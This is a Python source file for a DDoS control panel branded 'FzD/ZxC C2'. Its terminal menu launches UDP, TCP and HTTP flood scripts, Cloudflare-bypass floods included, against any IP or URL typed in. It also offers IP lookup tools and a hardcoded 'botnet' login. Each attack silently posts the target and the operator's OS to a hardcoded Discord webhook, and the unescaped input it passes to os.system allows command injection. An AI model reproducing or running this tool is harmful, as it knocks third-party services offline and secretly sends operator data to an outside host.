import socket
import os
import requests
import random
import getpass
import time
import sys
import json
import platform

def send_discord_webhook(webhook_url, message):
    data = {
        "content": message
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
      
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys) 

def si():
    print(f"         \x1b]2;ZxC C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
    print("")

def tools():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mTools     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mgeoip               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverse-dns           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverseip           \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255masn-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mdns-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')

def ports():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mPorts     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m21 - \x1b[38;2;0;255;255mSFTP       \x1b[38;2;0;212;14m69   - \x1b[38;2;0;255;255mTFTP      \x1b[38;2;0;212;14m5060  - \x1b[38;2;0;255;255mRIP  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m22 - \x1b[38;2;0;255;255mSSH        \x1b[38;2;0;212;14m80   - \x1b[38;2;0;255;255mHTTP      \x1b[38;2;0;212;14m30120 - \x1b[38;2;0;255;255mFIVEM\x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m23 - \x1b[38;2;0;255;255mTELNET     \x1b[38;2;0;212;14m443  - \x1b[38;2;0;255;255mHTTPS                  \x1b[38;2;0;212;14m║   
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mSMTP       \x1b[38;2;0;212;14m3074 - \x1b[38;2;0;255;255mXBOX                   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m53 - \x1b[38;2;0;255;255mDNS        \x1b[38;2;0;212;14m5060 - \x1b[38;2;0;255;255mPLAYSATION             \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255m<empty>       \x1b[38;2;0;212;14m25565 - \x1b[38;2;0;255;255m<empty>        \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
''')

def layer7():
    clear()
    si()
    print(f'''
                                          𝙇𝙖𝙮𝙚𝙧 7 𝙈𝙚𝙩𝙝𝙤𝙙
                                ═════════╦════════════════╦══════════
                        ╔════════════════╩════════════════╩═════════════════╗
             ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► http-raw         ║ L ║  ► http-rand        ║ L ║  ► mix              ║
             ║  ► http-socket      ║   ║  ► cf-bypass        ║   ║  ► cf-pro           ║
             ║  ► ovh              ║   ║  ► cf-socket        ║   ║  ► httpflood        ║
             ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
             ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► crash            ║ L ║  ► https-spoof      ║ L ║  ► dandier          ║
             ║  ► hyper            ║   ║  ► killer           ║   ║  ► soon             ║
             ║  ► slow             ║   ║  ► soon             ║   ║  ► soon             ║
             ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
''')

def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address
    
def layer4():
    clear()
    si()
    print(f'''
                                           𝙇𝙖𝙮𝙚𝙧 4 𝙈𝙚𝙩𝙝𝙤𝙙
                                ═════════╦════════════════╦══════════
                        ╔════════════════╩════════════════╩═════════════════╗
             ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► udp              ║   ║  ► stress           ║   ║  ► samplite         ║
             ║  ► samp             ║ L ║  ► home             ║ L ║  ► samppro          ║
             ║  ► udpbypass        ║   ║  ► god              ║   ║  ► sampvip          ║
             ║  ► destroy          ║   ║  ► soon             ║   ║  ► soon             ║
             ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
''') 

def get_device_name():
    hostname = socket.gethostname()
    return hostname

def menu(): 
     sys.stdout.write(f"         \x1b]2;FzD C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07") 
     clear() 
     print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mFzD \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to FzD C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: FzD Team \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1\x1b[38;2;0;255;255m | \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mFzD \x1b[38;2;0;255;255m]') 
     print("") 
     print(""" 
                        \x1b[38;2;0;212;14m░▐█▀▀\x1b[38;2;0;186;45m▒▐█▀▀▀█▌\x1b[38;2;0;150;88m░▐█▀█▄\x1b[38;2;0;113;133m░▐█▀█▄\x1b[38;2;0;83;168m▒▐█▀▀█▌\x1b[38;2;0;49;147m▒▄█▀▀█ 
                        \x1b[38;2;0;212;14m░▐█▀▀\x1b[38;2;0;186;45m░▒▄▄█▀▀░\x1b[38;2;0;150;88m░▐█▌▐█\x1b[38;2;0;113;133m░▐█▌▐█\x1b[38;2;0;83;168m▒▐█▄▒█▌\x1b[38;2;0;49;147m▒▀▀█▄▄ 
                        \x1b[38;2;0;212;14m░▐█──\x1b[38;2;0;186;45m▒▐█▄▄▄█▌\x1b[38;2;0;150;88m░▐█▄█▀\x1b[38;2;0;113;133m░▐█▄█▀\x1b[38;2;0;83;168m▒▐██▄█▌\x1b[38;2;0;49;147m▒█▄▄█▀ 
  
                 \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗ 
                 \x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239mWelcome to FZD C2 DDoS Panel        \x1b[38;2;0;49;147m║ 
                 \x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - - - -  \x1b[38;2;239;239;239mPrivate DDoS Panel 2023\x1b[38;2;0;212;14m - - - - - \x1b[38;2;0;49;147m║ 
                 \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝ 
                     \x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗ 
                     \x1b[38;2;0;212;14m║\x1b[38;2;239;239;239mhttps://github.com/177Members/ZxCDDoS \x1b[38;2;0;49;147m║  
                     \x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╝ 
                 \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗ 
                 \x1b[38;2;0;212;14m║   \x1b[38;2;239;239;239m   Type help to see the all commands.      \x1b[38;2;0;49;147m║ 
                 \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝ 
 """)
 
def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;0;212;14m╔══[root\x1b[38;2;0;186;45m@ka\x1b[38;2;0;150;88ml\x1b[38;2;0;113;133mi\x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
        if "layer7" in cnc or "l7" in cnc or "LAYER7" in cnc or "L7" in cnc:
            layer7()
        elif "layer4" in cnc or "LAYER4" in cnc or "L4" in cnc or "l4" in cnc:
            layer4()
        elif "ports" in cnc or "port" in cnc or "PORTS" in cnc or "PORT" in cnc:
            ports()
        elif "tools" in cnc or "tool" in cnc or "TOOLS" in cnc or "TOOL" in cnc:
            tools()
# LAYER 4 METHODS   

        elif "god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nGOD\n---------------\nTarget: {ip}:{port}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'perl god.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: god <ip> <port> <time>')
                print('Example: god 1.1.1.1 80 60')
                
        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nDESTROY\n---------------\nTarget: {ip}:{port}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')
                
        elif "samppro" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                thread = cnc.split()[4]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nSAMP-PRO\n---------------\nTarget: {ip}:{port}\nTime: {time}\nThread: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'python3 samp-pro.py {ip} {port} {time} {thread}')
            except IndexError:
                print('Usage: samppro <ip> <port> <time> <thread>')
                print('Example: samppro 1.1.1.1 80 60 1000')                

        elif "sampvip" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                thread = cnc.split()[4]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nSAMP-VIP\n---------------\nTarget: {ip}:{port}\nTime: {time}\nThread: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'python3 samp-vip.py {ip} {port} {time} {thread}')
            except IndexError:
                print('Usage: sampvip <ip> <port> <time> <thread>')
                print('Example: sampvip 1.1.1.1 80 60 1000')                
                
        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nHOME\n---------------\nTarget: {ip}:{port}\nPsize: {psize}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('Usage: home <ip> <port> <packet_size> <time>')
                print('Example: home 1.1.1.1 80 65500 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nUDP\n---------------\nTarget: {ip}:{port}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'python2 udp.py {ip} {port} 0 0')
            except IndexError:
                print('Usage: udp <ip> <port>')
                print('Example: udp 1.1.1.1 80')
                
        elif "samplite" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nSAMP-LITE\n---------------\nTarget: {ip}:{port}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'python3 samp-lite.py {ip} {port}')
            except IndexError:
                print('Usage: samplite <ip> <port>')
                print('Example: samplite 1.1.1.1 80')
# SPECIAL METHODS

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nSTRESS\n---------------\nTarget: {ip}:{port}\nConns: {conn}\nTime: {time}\nMode: {mode}\nOut: {out}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                
        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nSAMP\n---------------\nTarget: {ip}:{port}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'python2 samp.py {ip} {port}')
            except IndexError:
                print('Usage: samp <ip> <port>')
                print('Example: samp 1.1.1.1 7777')

# LAYER 7 METHODS
     
        elif "https-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nSPOOF\n---------------\nTarget: {url}\nTime: {time}\nThreads: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'python3 https-spoof.py {url} {time} {thread}')
            except IndexError:
                print('Usage: https-spoof <url> <time> <threads>')
                print('Example: https-spoof http://vailon.com 60 500')
    
        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nSLOW\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('Usage: slow <url> <time>')
                print('Example: slow http://vailon.com 60')
    
        elif "hyper" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nHYPER\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node hyper.js {url} {time}')
            except IndexError:
                print('Usage: hyper <url> <time>')
                print('Example: hyper http://vailon.com 60')
                
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
    
        elif "cf-pro" in cnc:
            try:
                os.system(f'python3 cf-pro.py')
            except IndexError:
                print('cf-pro')
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
        
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP-SOCKET\n---------------\nTarget: {url}\nPer: {per}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print('Usage: http-socket <url> <per> <time>')
                print('Example: http-socket http://example.com 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP-RAW\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print('Usage: http-raw <url> <time>')
                print('Example: http-raw http://example.com 60')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP-REQUEST\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node HTTP-REQUESTS {url} {time}')
            except IndexError:
                print('Usage: http-requests <url> <time>')
                print('Example: http-requests http://example.org 60')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP-RAND\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: http-rand <url> <time>')
                print('Example: http-rand http://vailon.com/ 60')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nCF BYPASS\n---------------\nTarget: {url}Time: {time}\nThread: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example.com 60 1250')

        elif "uambypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nUAM BYPASS\n---------------\nTarget: {url}\nTime: {time}\nPer: {per}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('Usage: uambypass <url> <time> <req_per_ip>')
                print('Example: uambypass http://example.com 60 1250')

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nCRASH\n---------------\nTarget: {url}\nMethod: {method}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: crash <url> METHODS<GET/POST>')
                print('Example: crash http://example.com GET')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                device_name = platform.system()
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
                send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP FLOOD\n---------------\nTarget: {url}\nThread: {thread}\nMethod: {method}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')
                
        elif "dandier" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nDANDIER\n---------------\nTarget: {url}\nThread: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'java dandier.java {url} {thread}')
            except IndexError:
                print('Usage: dandier <url> <threads>')
                print('Example: dandier http://example.com 15000')

        elif "ovh" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                time = cnc.split()[3]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nOVH\n---------------\nTarget: {url}\nThread: {thread}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'python3 start.py OVH {url} 4 {thread} http.txt 61 {time}')
            except IndexError:
                print('Usage: ovh <url> <thread> <time>')
                print('Example: ovh https://xnxx.com 800 60')
                
        elif "killer" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                time = cnc.split()[3]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nKILLER\n---------------\nTarget: {url}\nThread: {thread}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'python3 start.py KILLER {url} 4 {thread} http.txt 61 {time}')
            except IndexError:
                print('Usage: killer <url> <thread> <time>')
                print('Example: killer https://xnxx.com 800 60')
                
        elif "mix" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nMIX\n---------------\nTarget: {url}\nThread: {thread}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node mix.js {url} {time}')
            except IndexError:
                print('Usage: mix <url> <time>')
                print('Example: mix https://xnxx.com 60')
                
# TOOLS
        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')
                          
        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            print(f'''
LAYER7  ► SHOW LAYER7 METHODS
LAYER4  ► SHOW LAYER4 METHODS
PORTS   ► SHOW ALL PORTS
TOOLS   ► SHOW TOOLS
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
                
webhook_url = "https://discord.com/api/webhooks/1120049356687560726/HCEGcv4uqlTu4X5ATB7sVLihAUVXxfWdC9yYikP3MFaYJ4yfjpwhKno-F9DrT-SoPrTQ"

def login(): 
     clear() 
     user = "botnet" 
     passwd = "botnet" 
     username = input("⚡ Username: ") 
     password = getpass.getpass(prompt='⚡ Password: ') 
     if username != user or password != passwd: 
         print("") 
         print("⚡ You Poor Bitches.") 
         sys.exit(1) 
     elif username == user and password == passwd: 
         print("⚡ Welcome Bro To FzD C2!") 
         main() 
     
login()
